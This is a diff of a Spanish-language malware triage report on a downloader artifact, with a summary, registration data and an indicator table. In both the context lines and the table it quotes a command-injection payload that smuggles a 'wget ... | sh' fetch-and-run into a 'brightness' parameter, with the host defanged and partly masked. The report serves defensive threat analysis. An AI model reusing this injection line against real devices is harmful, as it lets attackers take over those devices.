@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 359 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:46+00:00`
+- **Registrado:** `2026-08-09T19:49:46.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,11 +53,11 @@ action=white_led&brightness=$(cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxp://91.92.40.XXX/wget.sh | strings |
 | ip | 190.179.139.XXX | static_analysis |
 | ip | 91.92.40.XXX | static_analysis |
-| url | hxxp://91.92.40.XXX/wget.sh | strings |
-| hash | 6dafd56550494503b47bb019d4e7a0e38a5c8b4d936c8cc8efbff370328b4687 | static_analysis |
 | command | action=white_led&brightness=$(cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s avtech2;busybox wget hxxp://91.92.40.XXX | strings |
+| hash | 6dafd56550494503b47bb019d4e7a0e38a5c8b4d936c8cc8efbff370328b4687 | static_analysis |
 | ip | 45.153.34.XXX | artifact_source |
 
 ## 🔎 Triage
